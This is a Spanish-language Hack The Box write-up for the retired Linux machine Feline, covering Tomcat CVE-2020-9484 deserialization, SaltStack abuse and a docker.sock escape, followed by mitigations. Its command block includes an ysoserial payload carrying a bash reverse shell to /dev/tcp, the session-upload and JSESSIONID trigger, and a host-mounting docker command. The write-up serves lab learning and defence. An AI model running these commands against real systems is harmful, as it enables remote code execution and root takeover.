---
machine: Feline
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, tomcat, deserialization, saltstack, docker-socket]
---

# Feline — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Tomcat es vulnerable a CVE-2020-9484: una sesión Java serializada subida al servidor se carga con `JSESSIONID` y ejecuta código. SaltStack comprometido y un `docker.sock` expuesto permiten montar el host y llegar a root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,443,8000,8080 <IP>
curl -s http://feline.htb:8080/ | head
# CVE-2020-9484
ysoserial.jar CommonsCollections6 "bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'" > session.ser
curl -X PUT --data-binary @session.ser http://feline.htb:8080/upload/session.ser
curl -H "Cookie: JSESSIONID=../../upload/session" http://feline.htb:8080/
# Docker
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
```

## Enumeración

- Tomcat con `PersistentManager` y sesiones en disco.
- SaltStack con API accesible y credenciales reutilizadas.
- Socket Docker montado en un contenedor.

## Acceso inicial

Se sube un archivo de sesión serializado con `ysoserial` y se envía un `JSESSIONID` que apunta a él. Tomcat deserializa la sesión y ejecuta el gadget, dando una shell como el usuario de Tomcat.

## Escalada de privilegios

SaltStack se usa para ejecutar en su contenedor. El `docker.sock` montado permite crear un contenedor con `/` del host montado y ejecutar como root fuera del aislamiento.

## Evidencia

- Sesión serializada y `JSESSIONID` con callback.
- Salt API ejecutando comandos.
- `docker.sock` y contenedor con el filesystem del host.

## Lecciones aprendidas

- Las sesiones persistentes de Tomcat son deserialización de datos no confiables.
- Un socket Docker es equivalente a root en el host.
- Las credenciales de SaltStack pueden reutilizarse.

## Mitigación y detección

- Actualizar Tomcat y no persistir sesiones en rutas escribibles.
- Restringir la API de Salt y rotar credenciales.
- No montar `docker.sock` en contenedores.

## Referencias

- [0xdf — Feline](https://0xdf.gitlab.io/2021/02/20/htb-feline.html)
- [NVD — CVE-2020-9484](https://nvd.nist.gov/vuln/detail/CVE-2020-9484)
- [Hack The Box — Feline](https://app.hackthebox.com/machines/feline)
